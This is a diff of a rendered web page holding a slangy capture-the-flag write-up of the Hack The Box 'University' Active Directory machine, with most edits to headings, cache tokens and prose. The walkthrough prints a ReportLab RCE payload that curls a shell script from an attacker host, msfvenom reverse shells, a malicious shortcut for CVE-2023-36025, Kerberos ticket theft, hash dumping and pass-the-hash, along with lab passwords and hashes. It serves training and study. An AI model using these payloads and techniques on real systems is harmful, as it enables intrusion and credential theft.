@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.808598423327">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.808760101605">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.11.0">
@@ -32,12 +32,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.11.0.808598423327" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.808760101605" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.808598423327" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.808760101605" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.808598423327" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.808598423327" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.808760101605" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.808760101605" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -192,18 +192,18 @@
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<doc-anchor-target id="synopsis" class="break-words">
-    <h1>
+<doc-anchor-target id="synopsis">
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
         <span>Synopsis</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using <code v-pre>xhtml2pdf</code>, which is vulnerable to a Remote Code Execution vulnerability via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33733">CVE-2023-33733</a>. This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor&#x27;s account, a malicious archive file is uploaded to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36025">CVE-2023-36025</a>, which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.</p>
 <doc-anchor-target id="enumeration">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
         <span>Enumeration</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>First thing we do is sign up for an account on the <code v-pre>university.htb</code> site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -218,7 +218,7 @@
 ...
 2024/12/22 13:35:40 &gt;  [+] VALID USERNAME:   kai.k@university.htb</code></pre>
 </doc-codeblock></div>
-<p>We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in, we peep this feature that lets you request a signed certificate. The site hits us with:</p>
+<p>We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we peep this feature that lets you request a signed certificate. The site hits us with:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).</code></pre>
 </doc-codeblock></div>
@@ -253,16 +253,16 @@ Department: Information Systems Security</code></pre>
 </doc-codeblock></div>
 <p>Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.</p>
 <doc-anchor-target id="foothold">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
         <span>Foothold</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
-<p>So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ <code v-pre>Export Profile to PDF</code> feature. Being the nosy guy I am, I yeet that file into exiftool to check metadata.</p>
+<p>So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ <code v-pre>Export Profile to PDF</code> feature. Being the nosy menace I am, I yeet that file into exiftool like:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ exiftool profile.pdf</code></pre>
 </doc-codeblock></div>
-<p>Boom — ReportLab shows up in the metadata. Turns out, ReportLab has <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>, a vuln so spicy it lets you slip arbitrary Python code into a PDF&#x27;s content and get RCE. So naturally, I stuffed my bio with something... special:</p>
+<p>Boom — ReportLab shows up in the metadata like &quot;hey bestie, wanna pwn me!&quot;. Turns out, ReportLab has <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>, a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;para&gt;
 &lt;font color=&quot;[[[getattr(pow, Word('__globals__'))['os'].system('curl -o shell.ps1 http://10.10.14.65:8000/shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'&quot;&gt;
@@ -288,15 +288,16 @@ PS C:\Web\University&gt; whoami
 university\wao</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="user">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
         <span>User</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
-<p>I’m chilling in my fresh shell as <code v-pre>university\wao</code> when I check my group memberships and see I&#x27;m in <code v-pre>Remote Management Users</code>. That basically means if I can get this user&#x27;s password, I can hop in through WinRM like it&#x27;s nothing.</p>
-<p>I start creeping around the filesystem like a raccoon on a snack run and eventually find a folder called <code v-pre>C:\Web\DB Backup</code>. Yeah... they really put “Backup” in the name and thought I wouldn’t look. Inside, I see a PowerShell script named <code v-pre>db-backup-automator.ps1</code>. The name alone is giving &quot;developer left something juicy in here&quot;, so you already know I’m opening that thing up looking for hardcoded creds or connection strings.</p>
+<p>I’m chilling in my fresh shell as <code v-pre>university\wao</code>, feeling like I just unlocked a secret character skin, when I peep my group memberships... Remote Management Users. So if I can snag this user’s password, I get to WinRM my way in like it’s the VIP lounge at cyberclub.</p>
+<p>So I start creeping around the filesystem like a raccoon on a 3 AM 7-Eleven snack run, nosing in everything, praying for leftover pizza crusts (aka plaintext creds). And what do I stumble on? A folder literally named <code v-pre>C:\Web\DB Backup</code>. Yeah... they really put “Backup” in the name and thought I wouldn’t look.</p>
+<p>Inside, I find a PowerShell script called <code v-pre>db-backup-automator.ps1</code>. And let me tell you — the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Web\DB Backups&gt; cat db-backup-automator.ps1
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Web\DB Backups&gt; cat db-backup-automator.ps1
 cat db-backup-automator.ps1
 $sourcePath = &quot;C:\Web\University\db.sqlite3&quot;
 $destinationPath = &quot;C:\Web\DB Backups\&quot;
@@ -318,7 +319,7 @@ Invoke-Expression -Command $7zCommand</code></pre>
 </doc-codeblock></div>
 <p>Pulled the <code v-pre>db.sqlite3</code> straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">sqlite&gt; select id,username,password,csr,user_type from University_customuser;
+<pre translate="no" class="language-sql"><code v-pre class="language-sql">sqlite&gt; select id,username,password,csr,user_type from University_customuser;
 
 2|george|pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=||Professor
 3|carolpbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc=||Professor
@@ -365,7 +366,6 @@ MN2k4hq7lST6Xr82Zs9iSwlAwsKa4aYrkAxaVptgyXcUdKD4xbk+Wde8cdA3mV/b
 cJxT1hFdCYlYZ1chHGSU6yRArmoGiIOjM/19yDhzjiRyd8MeosIl2Vq/czA=
 -----END CERTIFICATE-----</code></pre>
 </doc-codeblock></div>
-<p>Slide into the site as Martin.</p>
 <p><figure class="content-center">
     <img src="../../../../assets/images/writeups/university/lecture-upload.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
@@ -382,7 +382,7 @@ You selected this USER-ID:
 
 $ gpg --export -a &quot;martin.rose&quot; &gt; GPG-public-key.asc</code></pre>
 </doc-codeblock></div>
-<p>A <code v-pre>.url</code> file in our ZIP? Oh yeah, that’s free real estate for pointing to malicious scripts. Drop a batch file on <code v-pre>C:\Windows\Temp</code>, zip a link to it, sign it, upload it. Wait for the magic...</p>
+<p>Since this machine has not been updated for some time, we can suspect it being vulnerable to <a href="https://github.com/ka7ana/CVE-2023-36025">CVE-2023-36025</a>. So I cook up the most suspicious shortcut of all time: drop a batch file on <code v-pre>C:\Windows\Temp</code>, yeet a <code v-pre>.url</code> link to it inside a ZIP, slap a signature on it like I’m forging hall passes, and then upload it for the Content Evaluators like, “hey bestie, pls click my totally legit file <span class="docs-emoji">&#x2764;&#xFE0F;</span>.”</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ cat link.url 
 [InternetShortcut]
@@ -392,7 +392,7 @@ $ msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.65 lport=1337 &gt; r
 $ zip Lecture.zip link.url
 $ gpg -u &quot;martin.rose&quot; --detach-sign Lecture.zip</code></pre>
 </doc-codeblock></div>
-<p>Except... crickets. No callback. Alright, pivot time. Ping sweep the <code v-pre>192.168.99.0/24</code> subnet, find <code v-pre>WS-3</code> and <code v-pre>LAB-2</code> just chilling. Fire up <a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a>, proxy up, route the subnet, and remote into WS-3 like it’s my side chick.</p>
+<p>Except... crickets. No callback. Alright, pivot time. Ping sweep the <code v-pre>192.168.99.0/24</code> subnet, find <code v-pre>WS-3</code> and <code v-pre>LAB-2</code> just chilling. Fire up <a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a>, proxy up, route the subnet, and remote into <code v-pre>WS-3</code> like it’s my side chick.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ip tuntap add user $USER mode tun ligolo
 $ sudo ip link set ligolo up
@@ -411,7 +411,7 @@ wao@192.168.99.12's password: WebAO1337
 $ sudo su
 root@LAB-2:#</code></pre>
 </doc-codeblock></div>
-<p>Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if WS-3 does the heavy lifting?” energy. The idea: if a file gets opened from WS-3, we can make it point straight to LAB-2 and skip all the drama. So I tweak my reverse shell to target <code v-pre>LAB-2</code>&#x27;s IP (192.168.99.12) instead:</p>
+<p>Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if <code v-pre>WS-3</code> does the heavy lifting?” energy. The idea: if a file gets opened from <code v-pre>WS-3</code>, we can make it point straight to <code v-pre>LAB-2</code> and skip all the drama. So I tweak my reverse shell to target <code v-pre>LAB-2</code>&#x27;s IP (192.168.99.12) instead:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 &gt; rev.bat
 
@@ -419,7 +419,7 @@ root@LAB-2:#</code></pre>
 WS-3
 *Evil-WinRM* PS C:\Windows\Temp&gt; upload shell.bat</code></pre>
 </doc-codeblock></div>
-<p>Now the plan is simple: craft the .url file so it points at that batch file living on WS-3. As soon as some unsuspecting professor/admin clicks the shortcut, WS-3 will execute it, and boom — the callback will land right in LAB-2’s waiting arms.</p>
+<p>Now the plan is simple: craft the <code v-pre>.url</code> file so it points at that batch file living on <code v-pre>WS-3</code>. As soon as some unsuspecting professor/admin clicks the shortcut, <code v-pre>WS-3</code> will execute it, and boom — the callback will land right in <code v-pre>LAB-2</code>’s waiting arms.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@LAB-2:# nc -nlvp 1337
 Listening on [0.0.0.0]
@@ -437,10 +437,10 @@ Best regards.
 Help Desk team - Rose Lanosta.</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="root">
-    <h1>
+    <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
         <span>Root</span>
-    </h1>
+    </h2>
 </doc-anchor-target>
 <p>Right — now that we’ve got <code v-pre>Martin.T</code> on <code v-pre>WS-3</code>, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called <a href="https://github.com/decoder-it/LocalPotato">LocalPotato</a> (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let&#x27;s look for things that seem worthwhile.</p>
 <p>One file at <code v-pre>C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1</code> seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.</p>
@@ -493,10 +493,10 @@ ws-3\administrator</code></pre>
 </doc-codeblock></div>
 <p>That’s full local admin on <code v-pre>WS-3</code>. Now there are several ways to get the root flag.</p>
 <doc-anchor-target id="method-1">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#method-1">#</doc-anchor-trigger>
         <span>Method 1</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose&#x27;s TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with <code v-pre>/ptt</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -562,7 +562,7 @@ Calculating hashes for Current Value
 [*]       aes256_cts_hmac_sha1 : E671040580E4C9A3924F32527A231D0A640F9B02612A768DECC6111F3BA7100F
 [*]       des_cbc_md5          : FB7F0DF2EACE5E76</code></pre>
 </doc-codeblock></div>
-<p>Since <code v-pre>GMSA-PClient01$</code> is AllowedToAct on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says <code v-pre>Client: administrator @ UNIVERSITY.HTB</code>.</p>
+<p>Since <code v-pre>GMSA-PClient01$</code> is <code v-pre>AllowedToAct</code> on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says <code v-pre>Client: administrator @ UNIVERSITY.HTB</code>. Thats root baby!</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\tmp&gt; .\Rubeus.exe s4u /user:GMSA-PCLIENT01$ /rc4:0D333F335FDA7915C9B62D37056351C6 /impersonateuser:administrator /msdsspn:cifs/DC.university.htb /altservice:winrm /ptt
 
@@ -586,10 +586,10 @@ PS C:\tmp&gt; type \\dc.university.htb\c$\users\Administrator\Desktop\root.txt
 &lt;REDACTED&gt;</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="method-2">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#method-2">#</doc-anchor-trigger>
         <span>Method 2</span>
-    </h2>
+    </h3>
 </doc-anchor-target>
 <p>Another option we have is to dump the SAM database (download it with session in Evil-WinRM). Then we run <code v-pre>secretsdump.py</code> to to spit out every hash in the system, including the golden ticket: a default password chilling in plaintext.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -629,7 +629,7 @@ sshd:1001:aad3b435b51404eeaad3b435b51404ee:a8bf1bae201f988dc1ca99f1043e11dc:::
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Fire up Evil-WinRM as Brose.W, drop diskshadow <code v-pre>.dsh</code> script, spin up a shadow copy, expose it to Z:, robocopy the NTDS.dit and SYSTEM.SAV like it’s Hot Wheels. Download them, feed them to <code v-pre>secretsdump.py</code>, and it’s raining domain hashes.</p>
+<p>We fire up Evil-WinRM as Brose.W, drop diskshadow <code v-pre>.dsh</code> script, spin up a shadow copy, robocopy the NTDS.dit like it’s Hot Wheels. Download them, feed them to <code v-pre>secretsdump.py</code>, and it’s raining domain hashes.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.39 -u 'university.htb\brose.w' -p 'v3ryS0l!dP@sswd#X'
 
@@ -673,7 +673,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c4599e48661690fa6538fe96d366de:::
 
 &lt;SNIP&gt;</code></pre>
 </doc-codeblock></div>
-<p>Final move? Administrator hash in hand, Pass-the-Hash time. SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.</p>
+<p>Final move? We got the Administrator hash in our hands, meaning it is Pass-the-Hash time. We SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb 10.10.11.39 -u 'Administrator' -H 'e63413bab01a0b8820983496c0be3a9a' -x 'cat C:\Users\Administrator\Desktop\root.txt'</code></pre>
 </doc-codeblock></div>
